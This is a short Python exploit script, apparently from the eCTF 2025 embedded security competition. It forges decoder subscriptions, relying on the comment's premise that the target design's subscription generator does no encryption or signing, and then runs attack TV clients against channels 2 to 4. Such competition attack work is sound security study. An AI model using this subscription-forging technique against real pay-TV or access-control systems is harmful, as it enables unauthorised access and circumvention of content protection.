#!/usr/bin/env python3
# forge subscription if the encoder's gen_subscription function doesn't perform any encryption/signing
import asyncio
import itertools
import json
import os
import re
import sys

from ectf25.tv import TV
from ectf25_design.gen_subscription import gen_subscription
from loguru import logger

from attack_utils import (
    LimitedAttackTV,
    conn,
    get_decoder_id,
    recording_playback,
    run_attack,
)


async def main():
    decoder_id = get_decoder_id()

    r = conn()

    subscriptions = [
        gen_subscription(b"{}", decoder_id, 0, 2**63 - 1, i) for i in range(4)
    ]

    for subscription in subscriptions:
        r.subscribe(subscription)

    await recording_playback()

    for channel in [2, 3, 4]:
        tv = LimitedAttackTV(
            os.environ["IP"],
            int(os.environ[f"CHANNEL_{channel}_PORT"]),
            "/dev/ttyACM0",
            115200,
        )

        tv.run()


if __name__ == "__main__":
    run_attack(main, 30)
